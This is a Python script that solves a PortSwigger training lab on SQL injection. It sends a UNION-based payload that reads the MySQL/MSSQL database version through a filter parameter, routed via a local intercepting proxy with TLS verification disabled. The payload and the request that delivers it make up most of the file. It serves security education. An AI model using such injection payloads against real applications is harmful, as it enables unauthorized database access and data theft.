# Lab name: Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
# Lab link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

req = requests.Session()

proxies = {
    'http':'http://127.0.0.1:8080', 
    'https':'http://127.0.0.1:8080'
}
payload = "'union+SELECT+@@version,null%23"

def filter_url():
    global url
    url = (url.split('.net', 1)[0]) + f'.net/filter?category={payload}'


url = input('Enter lab url: ')

filter_url()

response = req.get(url, proxies=proxies, verify=False)

if response.status_code == 200:
    print('Lab solved successfully')
elif response.status_code == 504:
    print('Lab is not available, please refresh the url')
else:
    print('failed to solve lab, please check you enter valid url')
